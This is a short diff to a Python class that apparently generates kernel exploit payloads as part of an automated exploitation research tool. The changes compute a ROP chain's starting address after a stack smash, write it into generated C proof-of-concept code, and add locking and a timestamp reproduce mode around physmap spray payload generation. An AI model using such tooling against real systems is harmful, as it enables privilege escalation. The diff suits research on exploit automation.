@@ -15,6 +15,8 @@ class PayloadGenerationMixin:
         SPACESHIP = 0x91919000
         CANARY_LOCATION_DST = 0x9191a000 - self.current_smash_payload_len + self.current_smash_gadget[1]
         PAYLOAD_START = 0x9191a000 - self.current_smash_payload_len
+        number_of_saved_register = self.current_smash_gadget[0]
+        ROP_FIRST_GADGET_LOCATION = 0x9191a000 - self.current_smash_payload_len + self.current_smash_gadget[1] + 8 + number_of_saved_register*8
         NUM_OF_TRANSPORT = 10
         length_in_qword = len(payload) / 8
         c_payload = "// automatically generated osok payload \n// contact: ww9210@gmail.com\n"
@@ -26,6 +28,7 @@ add the following code to your rip control poc
     set_spaceship();
     do_transport=1;
     launch_transport();
+    //rop start at '''+hex(ROP_FIRST_GADGET_LOCATION)+'''
 */
 '''
         c_payload += "#define PAGESIZE 4096\n"
@@ -190,6 +193,10 @@ void do_mmap(){
                 # this constraint solving eat too much memory, we do not want to do that unless necessary
                 print 'generating...'
                 spray_payload = self.generate_physmap_spray_payload(spray_content)
+                # update payload number
+                if self.lock is not None:
+                    self.lock.acquire()
+                self.update_generated_payload_number()
                 self.num_of_generate_payload += 1
                 filename = 'physmap_payload_' + '%07d' % self.num_of_generate_payload + '.h'
                 filepath = 'payloads/' + filename
@@ -206,7 +213,10 @@ void do_mmap(){
                     info += 'prologue gadget:' + self.current_prologue_gadget[5] + '\n'
                     info += 'disclosure gadget:' + self.current_disclosure_gadget[3] + '\n'
                     info += 'smash gadget:' + self.current_smash_gadget[3] + '\n'
-                    info += hex(int(time.time())) + '\n'
+                    if self.reproduce_mode:
+                        info += hex(self.current_timestamp) + '\n'
+                    else:
+                        info += hex(int(time.time())) + '\n'
                     f.write(info)
 
                 # prepare detail information for debugging purpose
@@ -245,6 +255,8 @@ void do_mmap(){
 
                     # write these detail files to file
                     f.write(detail)
+                if self.lock is not None:
+                    self.lock.release()
 
                 return True
             else:
